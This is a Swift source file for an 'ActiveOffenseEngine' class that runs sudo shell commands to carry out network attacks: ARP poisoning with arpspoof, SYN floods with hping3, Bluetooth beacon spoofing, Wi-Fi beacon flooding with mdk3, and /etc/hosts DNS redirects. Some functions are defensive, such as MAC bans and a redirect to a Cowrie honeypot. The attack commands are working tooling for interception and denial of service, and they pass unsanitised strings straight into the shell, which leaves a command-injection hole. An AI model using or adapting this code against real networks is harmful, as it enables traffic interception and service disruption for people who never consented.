import Foundation

class ActiveOffenseEngine {
    
    func reverseARPPoison(targetIP: String, targetMAC: String, gatewayIP: String) {
        Shell.run("sudo arpspoof -t \(gatewayIP) \(targetIP)")
        Shell.run("sudo arpspoof -t \(targetIP) \(gatewayIP)")
        log("[ActiveOffenseEngine] Reverse ARP Poisoning initiated for \(targetIP) and \(gatewayIP)")
    }
    
    func synFlood(targetIP: String, port: Int) {
        Shell.run("sudo hping3 -S -p \(port) --flood \(targetIP)")
        log("[ActiveOffenseEngine] SYN Flood against \(targetIP):\(port)")
    }
    
    func spoofBeacon(name: String, uuid: String) {
        Shell.run("sudo hciconfig hci0 leadv 3 && sudo hcitool -i hci0 cmd 0x08 0x0008 \(uuid)")
        log("[ActiveOffenseEngine] Beacon Spoof: \(name) @ UUID \(uuid)")
    }
    
    func networkFlood(interface: String) {
        Shell.run("sudo mdk3 \(interface) b -a")
        log("[ActiveOffenseEngine] mdk3 flooding on \(interface)")
    }
    
    func triggerKnock(ip: String, ports: [Int]) {
        for port in ports {
            Shell.run("nc -zv \(ip) \(port)")
        }
        log("[ActiveOffenseEngine] Port knock sequence to \(ip): \(ports.map(String.init).joined(separator: ", "))")
    }
    
    func ban(mac: String) {
        Shell.run("sudo ipfw add deny ip from any to any mac \(mac)")
        log("[ActiveOffenseEngine] Banned MAC \(mac)")
    }
    
    func terminateAllRadios() {
        Shell.run("sudo ifconfig en0 down; sudo pkill -9 bluetoothd")
        log("[ActiveOffenseEngine] Terminated radios")
    }
    
    func cowrieRedirect() {
        Shell.run("sudo ipfw add fwd 127.0.0.1,22 tcp from any to any dst-port 22")
        log("[ActiveOffenseEngine] Redirected traffic to Cowrie honeypot")
    }
    
    func dnsRedirect(domain: String, toIP: String) {
        let entry = "\(toIP) \(domain)"
        try? entry.appendLine(to: "/etc/hosts")
        log("[ActiveOffenseEngine] DNS redirect for domain \(domain) to \(toIP)")
    }
    
    private func log(_ entry: String) {
        let ts = ISO8601DateFormatter().string(from: Date())
        try? "[\(ts)] \(entry)".appendLine(to: "/tmp/hydra_offense.log")
    }
}
